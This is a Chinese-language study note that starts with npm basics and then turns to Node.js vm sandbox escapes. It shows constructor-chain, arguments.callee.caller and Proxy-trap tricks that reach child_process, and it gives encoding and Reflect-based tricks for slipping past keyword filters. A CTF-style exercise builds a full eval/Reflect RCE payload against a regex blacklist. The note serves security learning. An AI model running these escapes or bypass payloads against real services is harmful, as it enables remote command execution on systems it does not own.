## 包管理器npm
NPM（Node Package Manager）是一个 JavaScript 包管理工具，也是 Node.js 的默认包管理器。
类似于python的pip包管理器，NPM 可以帮助你安装并管理项目所需的各种第三方库（包）。例如，可以通过简单的命令来安装、更新、或删除依赖。
执行
```
npm -v
```
如果输出版本号，就说明安装了，

#### 相关命令
| 命令                      | 介绍                                                                                |
| ----------------------- | --------------------------------------------------------------------------------- |
| npm init                | 初始化工程                                                                             |
| npm init -y             | 可以跳过向导，快速初始化工程                                                                    |
| npm install             | 简写npm i，自动下载package.json中dependencies中全部的依赖。                                      |
| npm install 包名          | 简写npm i 包名，下载指定包。                                                                 |
| npm install --save 包名   | 简写npm i -S 包名，下载并保存依赖项（package.json中dependencies） 5.0.0版本之后的npm会自动保存到dependencies |
| npm uninstall 包名        | 简写npm un 包名，只删除，如果有依赖项会依然保存                                                       |
| npm uninstall --save 包名 | 简写npm un -S 包名，删除的同时也会将依赖信息删除                                                     |
| npm help                | 查看使用帮助                                                                            |
| npm 命令 --help           | 查看对应命令的使用帮助，例如我忘记uninstall的简写，那么我可以输入npm uninstall --help                         |
#### 初始化工程
使用npm init命令可以把当前文件夹初始化成一个“包”，即一个标准的nodejs工程
```
npm init

npm init -y		# 全面使用默认值来初始化项目
```
按照提示输入相关信息，如果是用默认值则直接回车即可。
执行完npm init后会生成package.json文件，这个是包的配置文件，相当于maven的pom.xml，我们之后也可以根据需要进行修改。
#### 使用npm命令安装模块
npm安装nodejs模块的语法格式如下
```
npm install <Module Name>
```
例如
```
npm install express
```
安装好之后，在该目录下已经出现了一个`node_modules`文件夹和`package-lock.json`文件。
- node_modules文件夹：用于存放下载的js库（相当于maven的本地仓库）。
- package-lock.json文件：确定当前安装的包的依赖，以便后续重新安装的时候生成相同的依赖，而忽略项目开发过程中有些依赖已经发生的更新。
```
var express = require('express');
```
我们再打开package.json文件，发现刚才下载的jquery已经添加到依赖列表中了，依赖包会被添加到dependencies节点下，
安装时想指定特定的版本：
```
npm install jquery@3.2.1
```
#### 全局安装
在 npm 中，`-g` 是 `--global` 的缩写，表示**全局安装**。它的作用是将一个包（package）安装到系统的全局环境中，而不是当前项目的本地目录。全局安装后的包可以在系统的任何目录下通过命令行直接使用。
全局安装适用于需要跨项目使用的**命令行工具**或全局工具。例如：`vue-cli`（Vue 脚手架）、`create-react-app`（React 脚手架）、`nodemon`（自动重启 Node 服务）等。
全局安装的路径：
- Windows：  `C:\Users\<用户名>\AppData\Roaming\npm\node_modules`
- macOS/Linux：  `/usr/local/lib/node_modules`
我们使用`npm install <packageName>`就能在线下载依赖到本地的node_modules目录，但我们项目打包时通常不会打包项目的node_modules以减轻项目大小。当项目发送给了团队的其他成员时只有源代码而没有项目所需的依赖，此时项目是无法运行的。

因此我们安装某个依赖时，除了下载依赖项到本地的node_modules目录外，还应该记录当前项目的依赖项配置，这样就算其他人获得到了项目源代码也可以按照依赖项配置来下载当前项目所需依赖。
在安装（npm install xxx）某个依赖项时，可以通过配置`--save`或`--save-dev`来将该依赖项记录下来
> Tips：从npm 5.0.0版本开始，默认行为改变了。现在当运行npm install xxx时，npm会自动将包添加到dependencies中，相当于之前需要–save的效果。

例如
```js
{
    // jquery是开发依赖
  "devDependencies": {
    "jquery": "^3.7.1"
  },
      // bootstrap是生产依赖
  "dependencies": {
    "bootstrap": "^5.3.5"
  }
}

```
项目运行时必须依赖的包（无论是本地开发、生产环境还是其他环境），例如一些框架或常用库，如：JQuery、Bootstrap、Vue、axios等依赖，如果缺少这些依赖，代码将无法运行，这些依赖就应该是dependencies；

一些仅在开发阶段需要的依赖，生产环境不需要。例如一些构建、转码、测试工具等，如webpack、babel、eslint、jest等，这些依赖投入到生产环境中就再也不需要了，这些依赖就应该是devDependencies；
#### package.json和package-lock.json文件
**package.json**文件
package.json定义了这个项目所需要的各种模块，以及项目的配置信息，包括名称、版本、许可证、依赖模块等元数据。

当执行 npm install 的时候，node 会先从 package.json 文件中读取所有 dependencies 信息，然后根据 dependencies 中的信息与 node_modules 中的模块进行对比，没有的直接下载，已有的检查更新。另外，package.json 文件只记录你通过 npm install 方式安装的模块信息，而这些模块所依赖的其他子模块的信息不会记录。
**package-lock.json文件**
package.json文件中保存着项目的依赖以及这些依赖的版本信息，但是这些依赖的版本并非是一个固定的，而是可以随着时间的流逝（例如该依赖发布了新版本）自动更新的。因此，同一个package.json在不同时间点执行`npm install`可能会导致项目实际使用的依赖版本不同。
package-lock.json文件正是来解决这个问题的。
package-lock.json 文件会保存 node_modules 中所有包的信息，包括精确版本 version 和下载地址 resolved 以及依赖关系 dependencies 等，用以记录当前状态下实际安装的各个模块的具体来源和版本号。这样 npm install 时速度就会提升。

当项目中已有package-lock.json 文件，在安装项目依赖时，将以该文件为主进行解析安装指定版本依赖包，而不是使用 package.json 来解析和安装模块。因为 package.json 指定的版本不够具体，而package-lock 为每个模块及其每个依赖项指定了版本，位置和完整性哈希，所以它每次的安装都是相同的。
项目中存在了package-lock.json当下载依赖时会以该文件中锁定的版本来下载，但有时我们也希望更新一下项目依赖，此时可以执行`npm update`来更新项目的依赖版本，并且更新package-lock.json锁定的版本。
如果项目中没有package-lock.json可以使用如下命令来构建一个package-lock.json：
```shell
npm install --package-lock-only
```
## vm库和的沙箱
#### 基本概念
什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。
vm模块是nodejs内置的模块。vm模块可以在当前Node.js 进程中创建一个新的沙箱环境，通过该沙箱环境执行用户提供的代码，以防止不安全的操作对主进程产生负面影响，但是这个vm模块的隔离功能并不完善，nodejs提供了第三方模块vm2，提供了更加安全、灵活和自定义的沙箱环境和代码执行功能。
#### node将字符串执行为代码
创建一个包含year变量的文件，通过fs模块去读取文件内容，然后用eval函数去执行内容
```js
//year.txt
var year=2024
```

```js
//1.js
let year=2024
console.log (year)
const fs = require('fs')
let aaa =fs.readFileSync("./year.txt",'UTF-8')
eval(aaa)
```
执行后就报错了，因为在js中每一个模块都有自己独立的作用域，当前作用域下已经有了year变量
#### new Function
```js
let year = 2024
console.log(year)
//const fs = require('fs')
//let aaa = fs.readFileSync('./year.txt','UTF-8')
//eval(aaa)
const fun = new Function('year','return year+2')
console.log(fun(year))
```
这里创建了一个fun函数，第一个参数是形参，第二个参数是函数主体。
看了上面的例子，我们如何通过传递字符串就能够将字符串执行为代码并且拥有自己的作用域呢，我们就需要用到vm模版。
#### Nodejs作用域
我们可以通过require去引入文件，比如我们去引入fs模块require("fs")。
每个文件都有自己的作用域，也就是我们在1.js中去require('2.js')，也不能直接在1.js中直接使用2.js中的变量和函数。
```js
//2.js
const age=18
```

```js
//1.js
let year=2024
console.log (year)
const re= require("./2")
console.log(re.age)
```
执行会输出
```
2024
undefined
```
age为undefined。
如果要使用2.js的属性，node给我们提供了exports，exports是模块公开接口。
有关exports和module.exports的区别。
- 正常对外暴露属性或方法，使用exports
- 如需要暴露对象(类似class，包含了很多属性和方法)，就使用`module.exports`
```js
//2.js
exports.age=18
exports.hello=function(){
   console.log("hello")
}
```

```js
//1.js
let year=2024
console.log (year)
const fun=new Function('year','return year+2')
console.log(fun(year))
const re= require("./2")
console.log(re.age)
re.hello()
```
#### vm模块的一些API
==`vm.runInThisContext(code[,options])`==:
`vm.runInThisContent()`编译code，在当前global的上下文中运行它并返回结果，运行代码无权访问局部作用域，但可以访问当前global对象。
如果options是字符串，则指定文件名。
也就是在当前global下创建一个作用域(sandbox)，将code当作代码执行，sandbox可以访问到global属性，无法访问其他包中的。
```js
const vm = require('vm');
let localVar = 'initial value';
const vmResult = vm.runInThisContext('localVar = "vm";');
console.log(`vmResult:${vmResult},localVar:${localVar}`);
//vmResult:vm,localVar:initial value

const evalResult = eval('localVar = "eval";');
console.log(`evalResult: '${evalResult}', localVar: '${localVar}'`);
//evalResult: 'eval', localVar: 'eval'
```
出现差异的原因是eval可以直接绑定到当前执行的作用域，可以修改作用域里的变量，而vm运行时会创建一个隔离的上下文，代码里的`localVar`其实是一个新变量，和外部的`localVar`其实是两个东西。
==`vm.createContext([contextObject[,options]])`==
`contextObject`:创建的沙箱对象，如果省略`contextObject`（或显式传递为undefind），将返回一个新的空contextfied对象，v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象。沙箱内部无法访问global属性
==`vm.runInContext(code, contextifiedObject[, options])`==
runInContext要结合上面的createContext一起用，
code:要编译和运行的 JavaScript 代码。 contextifiedObject:上边通过vm.createContext()创建的作用域沙箱对象。
```js
const vm = require('node:vm');
//给全局对象挂载一个globalVar值为3
global.globalVar = 3;
//创建普通对象context,内部有自己的globalVar 值为 1
const context = {globalVar:1}
//把context包装成一个独立的VM上下文，隔离环境
vm.createContext(context);
//执行结果直接赋值到context对象的globalVar属性上
vm.runInContext('globalVar *= 2;',context);
console.log(context);
//{ globalVar: 2 }
console.log(global.globalVar);
//3
//隔离环境的操作无法影响全局
```
==`vm.runInNewContext()`==
它允许我们在一个新的沙盒环境中执行 JavaScript 代码，并返回执行结果。该方法接受两个参数：要执行的 JavaScript 代码和一个可选的上下文对象。
#### vm沙箱逃逸
沙箱逃逸首先要获得process对象，然后通过require来导入具有攻击的模块，如`child_process`,然后通过`child_process.execSync()`进行RCE。而process属于全局(global)对象，我们上边说了vm.createContex() 沙箱内部无法访问global中的属性，所以目标就是将global上的process引入到沙箱中。
```js
const vm = require("vm");
const y1 = vm.runInNewContext(`this.constructor.constructor('return global')()`,{});
console.log(y1.process);
```
代码通过runInNewContext()我们传递了要执行的代码和一个空对象。
- `this`：是沙箱上下文的全局对象（对应传入的 `{}`），是隔离环境里的根对象。
- `this.constructor`：this是普通对象，他的构造函数是`Object`，(即 `Object.prototype.constructor`）
- `this.constructor.constructor` Object的构造函数是Function(函数的构造函数)，所有的函数都由Function构造，包括Object
- `Function('return global')()`用Function构造函数创建一个匿名函数，执行后返回global。
这样就绕过了沙箱，拿到process，之后就可以执行命令了。
```js
const vm = require("vm");
const y1 = vm.runInNewContext(`this.constructor.constructor('return process')()`,[]);
console.log(y1.mainModule.require('child_process').execSync('whoami').toString());
```
输出`laptop-3i2gtl5g\lenovo` 因为`Function`构造的函数其执行上下文是global所以可以直接访问全局的process。
- y1是process对象，`process.mainModule` 指向 Node.js 主模块，它自带原生的require方法，
- `require('child_process')`加载 Node.js 的 `child_process` 模块（系统命令执行的核心模块）
- `execSync('whoami')`同步执行系统命令 `whoami`（获取当前系统用户名），`execSync` 是阻塞式执行，直接返回命令输出的二进制数据。
- `toString()`将二进制的命令输出转换成字符串，方便打印
#### 逃逸的一些情况
`arguments.callee.caller`:一个函数的内置属性，这个属性中保存着调用当前函数的函数的引用，如果是在全局作用域中调用当前函数，它的值为null。
我们沙箱逃逸就是为了找到一个沙箱外的对象，然后通过.constructor.constructor('return process')()返回process，这样我们就能逃逸了。
我们可以在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller属性就会返回沙箱外的一个对象。
```js
const vm = require('vm');
const script =
`(e => {
    const a = {}
    a.toString = function(){
        const cc = arguments.callee.caller;
        const p = (cc.constructor.constructor('return process'))();
        return p.mainModule.require('child_process').execSync('whoami').toString()
        }
    return a
    }
)()`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script,context);
console.log('hello '+ res);
```
这样也可以逃逸执行指令。
- `const a = {}`创建空对象。
- `a.toStirng = function(){}`重写a的toString方法。
- `arguments.callee.caller`溯源函数调用栈，拿到外层调用者，`arguments.callee`指向当前正在执行的函数（也就是重写后的toString方法）。`arguments.callee.caller`指向调用当前函数的上层函数（即触发toString的那个函数，比如字符串拼接时的内置转换函数）；
- `(cc.constructor.constructor('return process'))()`拿到process。
- `return a`返回这个带恶意toString的对象。
- `Object.create(null)`创建完全空的原型链对象，比普通`{}`更严格，没有`__proto__`
- `new vm.createContext(sandbox)`创建隔离上下文。
- `vm.runInContext(script,context)`在隔离上下文执行脚本，res接收脚本返回的「带恶意toString的对象a」
- `'hello '+ res`执行时JS 会自动调用 `res` 的 `toString()` 方法（因为要把对象转换成字符串才能拼接）；
- 此时就会执行我们重写的toString函数，逃逸逻辑就会触发。
- 最终输出`hello laptop-3i2gtl5g\lenovo`
#### Proxy劫持
如果没有执行字符的操作来触发toString，可以用Proxy来劫持属性。 
Proxy的用法
```js
let proxy = new Proxy(target, handler)
```
- `target` 是要包装的对象，可以是任何东西，包括函数。
- `handler`代理配置，带有钩子（“traps”，即拦截操作的方法）的对象，比如`get`钩子用于读取target属性，`set`钩子用于写入target属性。
**get钩子**：读取属性时触发get钩子。
```js
const vm = require('vm');
const script =
`
(() =>{
    const a = new Proxy({},{
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();}}
    )
    return a
    }
)()
`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script,context);
console.log(res.abc);
```
- `new Proxy(target,handler)`：Proxy是ES6提供的代理对象，可以拦截目标对象（这里是{}）的几乎所有操作。
- `handler.get`是属性访问陷阱，当你访问Proxy的任意属性（比如a.abc,a.xxx）,都会触发这个get函数。
定义一个a对象，设定了一个get钩子，钩子里面用来过去调用者
最后执行命令
这个和上一个差不多，一个是通过toSring来触发，一个通过访问属性时触发。
#### 异常抛出沙箱
沙箱内没有返回值或者我们外部不能利用返回值，我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出。
```js
const vm = require('vm');
const script =
`
    throw new Proxy({},{
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();}}
    )
`;
try {
    vm.runInContext(script,vm.createContext(Object.create(null)));
}catch(e){
    console.log('error '+ e);
}
```
- 这一次没有return返回Proxy对象，而是直接抛出一个Proxy对象作为异常。
- ` vm.runInContext`执行脚本时，脚本抛出了Proxy对象，这个对象会被catch(e)捕获，e就是那个恶意Proxy。
- 直到执行`console.log('error '+ e);`攻击才开始触发，执行 `'error ' + e` 时，JS 引擎需要把异常对象 `e`（Proxy 对象）转换成字符串；
- 转换字符串的过程中，JS 引擎会**自动访问 Proxy 对象的多个内置属性**（比如 `toString`、`valueOf`、`[Symbol.toStringTag]` 等）；
- 只要访问Proxy 对象的任意属性，就会触发我们定义的 `get` 陷阱函数；


## nodejs中代码执行绕过技巧
#### child_process
child_process是nodejs中用来执行系统命令的模块。`nodejs`通过使用`child_process`模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：
```
execFileSync、spawnSync,execSync、fork、exec、execFile、spawn
```
而这些方法使用到的都是`spawn()`方法，因为`fork`是运行另外一个子进程文件，这里列一下除fork外其他函数的用法。
```js
require("child_process").exec("sleep 3"); 
require("child_process").execSync("sleep 3"); require("child_process").execFile("/bin/sleep",["3"]); //调用某个可执行文件，在第二个参数传args 
require("child_process").spawn('sleep', ['3']); require("child_process").spawnSync('sleep', ['3']); require("child_process").execFileSync('sleep', ['3']);
```
#### nodejs中命令执行
先写一个简化的服务端，
```js
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
app.use(bodyParser.urlencoded({extended:true}))
app.post('/',function(req,res){
    code = req.body.code;
    console.log(code);
    res.send(eval(code));
})
app.listen(3000);
```
就是接受`post`方式传过来的code参数，然后返回`eval(code)`的结果。
运行后访问`http://127.0.0.1:3000`发送post请求，
```
code=require('child_process').execSync('whoami').toString()
```
这样就可以命令执行。
当然实际情况可能是会对用户输入做一些过滤例如把exec给过滤了
#### 十六进制编码
第一种思路是16进制编码，原因是在`nodejs`中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的
```js
console.log('a'==='\x61');
//true
```
所以可以写成
```
require('child_process')['exe\x63Sync']('whoami').toString()
```
#### unicode编码
```
console.log("\u0061"==="a"); // true
require('child_process')['exe\u0063Sync']('whoami').toString()
```
#### 加号拼接
原理很简单，加号在js中可以用来连接字符，所以可以这样
```
require('child_process')['exe'%2B'cSync']('whoami').toString()
```
#### 模板字符串
**模板字面量**是用反引号（`` ` ``）分隔的字面量，允许[多行字符串](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%A4%9A%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2)、带嵌入表达式的[字符串插值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC)和一种叫[带标签的模板](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF)的特殊结构。
模板字面量是允许嵌入表达式的字符串字面量。你可以使用多行字符串和字符串插值功能。
```
require('child_process')[`${`${`exe`}cSync`}`]('whoami').toString()
```
#### concat连接
利用js中的concat函数连接字符串
```
require('child_process')['exe'.concat('cSync')]('whoami').toString()
```
#### base64编码
```
eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==','base64').toString()).toString()
```
用 `Buffer.from(..., 'base64')` 把 Base64 字符串解码成二进制数据；再toString()转换成字符串，用eval执行，再用`toString()`转换成字符串格式输出。
#### Object.keys
利用`Object.values`就可以拿到`child_process`中的各个函数方法，再通过数组下标就可以拿到`execSync`
```js
console.log(Object===require('child_process').constructor) //true
console.log(Object.values(require('child_process'))[5]) // [Function: execSync]
Object.values(require('child_process'))[5]('whoami').toString()
```
#### Reflect
在js中，需要使用`Reflect`这个关键字来实现反射调用函数的方式。譬如要得到`eval`函数，可以首先通过`Reflect.ownKeys(global)`拿到所有函数，然后`global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]`即可得到eval
```js
console.log(Reflect.ownKeys(global))  //返回所有函数
console.log(global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]) //拿到eval
global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('global.process.mainModule.constructor._load("child_process").execSync("whoami")').toString()
```
这里虽然有可能被检测到的关键字，但由于`mainModule`、`global`、`child_process`等关键字都在字符串里，可以利用上面提到的方法编码，譬如unicode编码。
```
global[Reflect.ownKeys(global).find(x=>x.includes('eval'))]('\u0067\u006c\u006f\u0062\u0061\u006c\u002e\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u002e\u006d\u0061\u0069\u006e\u004d\u006f\u0064\u0075\u006c\u0065\u002e\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u002e\u005f\u006c\u006f\u0061\u0064\u0028\u0022\u0063\u0068\u0069\u006c\u0064\u005f\u0070\u0072\u006f\u0063\u0065\u0073\u0073\u0022\u0029\u002e\u0065\u0078\u0065\u0063\u0053\u0079\u006e\u0063\u0028\u0022\u0077\u0068\u006f\u0061\u006d\u0069\u0022\u0029').toString()
```
这里还有个小trick，如果过滤了`eval`关键字，可以用`includes('eva')`来搜索`eval`函数，也可以用`startswith('eva')`来搜索
#### 过滤中括号
在`3.2`中，获取到eval的方式是通过`global`数组，其中用到了中括号`[]`，假如中括号被过滤，可以用`Reflect.get`来绕
> `Reflect.get(target, propertyKey[, receiver])`的作用是获取对象身上某个属性的值，类似于`target[name]`。

所以取eval函数的方式可以变成
```
console.log(Reflect.get(global,Reflect.ownKeys(global).find(x=>x.includes('eva'))))
```
payload就成了
```
Reflect.get(global,Reflect.ownKeys(global).find(x=>x.includes('eva')))('global.process.mainModule.constructor._load("child_process").execSync("whoami")').toString()
```
## 例题
```js
const express = require('express')
const bodyParser = require('body-parser')
const app = express()

var validCode = function (func_code){
  let validInput = /subprocess|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|"|'|\[|\+|\*/ig;
  return !validInput.test(func_code);
};

app.use(bodyParser.urlencoded({ extended: true }))
app.post('/', function (req, res) {
  code = req.body.code;
  console.log(code);
  if (!validCode(code)) {
    res.send("forbidden!")
  } else {
    var d = '(' + code + ')';
    res.send(eval(d));
  }
})

app.listen(3000)
```
可以看到过滤了单双引号，这里可以全部换成反引号，这里没有过滤Reflect，考虑用发射调用函数实现RCE。
先写出
```
eval(Buffer.from(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==`,`base64`).toString()).toString()
```
这个明显不可以，因为base64被过滤了，可以换成
```
`base`.concat(64)
```
过滤掉了
Buffer可以换成
```
Reflect.get(global,Reflect.ownKeys(global).find(x=>x.includes(`Buf`)))
```
要拿到Buffer.from可以通过下标。
```
Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`))))[1]
```
但是它把中括号也过滤了，直接再套一层Reflect.get
```
Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)
```
所以payload变成
```
Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==`,`base`.concat(64)).toString()
```
但问题在于，这样传过去后，eval只会进行解码，而不是执行解码后的内容，所以需要再套一层eval，因为过滤了eval关键字，同样考虑用反射获取到eval函数。
```
Reflect.get(global,Reflect.ownKeys(global).find(x=>x.startsWith(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJ3aG9hbWkiKQ==`,`base`.concat(64)).toString()).toString()
```
用十六进制编码也可以
```
Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes(`eva`)))(Reflect.get(Object.values(Reflect.get(global, Reflect.ownKeys(global).find(x=>x.startsWith(`Buf`)))),1)(`676c6f62616c2e70726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428226368696c645f70726f6365737322292e6578656353796e63282277686f616d692229`,`he`.concat(`x`)).toString()).toString()
```
也可以拿到eval后直接传十六进制字符串
```
Reflect.get(global, Reflect.ownKeys(global).find(x=>x.includes(`eva`)))(`\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x77\x68\x6f\x61\x6d\x69\x22\x29`).toString()
```

## VM2库的沙箱


## 参考
https://blog.csdn.net/Bb15070047748/article/details/147381183
https://blog.foreverwl.top/archives/1711448630872
https://www.anquanke.com/post/id/237032
https://es6.ruanyifeng.com/?search=weakmap&x=0&y=0#docs/proxy